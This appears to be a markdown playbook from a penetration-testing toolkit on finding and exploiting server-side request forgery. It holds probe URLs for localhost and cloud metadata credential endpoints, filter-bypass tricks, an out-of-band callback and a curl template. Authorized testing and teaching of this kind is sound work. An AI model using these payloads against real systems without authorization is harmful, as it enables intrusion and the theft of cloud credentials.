# SSRF

**Prerequisite:** Target with URL-fetch behavior in [`../../AUTHORIZATION.md`](../../AUTHORIZATION.md). No blind mass scanning of internal networks unless lab/RoE allows.

## Decision tree

```text
Parameter accepts URL/host/path?
├─ Full URL (url=, link=, src=, webhook=) → internal IPs, metadata, protocol smuggling
├─ Partial host → DNS rebinding (advanced, document only if observed)
├─ PDF/image import → file://, gopher:// (if supported)
└─ Fixed path only → path traversal to internal services
```

## Find injection points

Search proxy history / intel endpoints for:

```
url, uri, link, src, dest, redirect, callback, webhook, fetch, proxy, path, file, document, import, avatar, screenshot
```

## Basic probes (Repeater)

Replace parameter value:

```http
http://127.0.0.1/
http://127.0.0.1:80/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://0177.0.0.1/
http://127.1/
http://localtest.me/
```

## Out-of-band (if blind)

```bash
# Burp Collaborator or your in-scope canary
http://YOUR-COLLAB.oastify.com/
```

## Cloud metadata (RoE explicit)

```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
# Header: Metadata-Flavor: Google
```

## Filter bypass ideas

| Block | Try |
|-------|-----|
| `127.0.0.1` | `127.0.0.1.nip.io`, decimal/octal IP, IPv6 |
| `http` only | `https://127.0.0.1`, redirect chain |
| Blocklist host | open redirect on allowed domain → internal |

## curl template

```bash
curl -sk "https://app.example.com/api/fetch" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:80/"}'
```

## Chain to impact

- Metadata creds → `cloud-security`
- Internal admin panel → document + `reporting`
- Redis/cloud API on localhost → minimal PoC only

## Intel hooks

```bash
python3 ../../scripts/intel.py engagement/TARGET/intel.json add-vuln --severity high "SSRF on /api/fetch url param"
python3 ../../scripts/intel.py engagement/TARGET/intel.json mark-done ssrf_probe
```
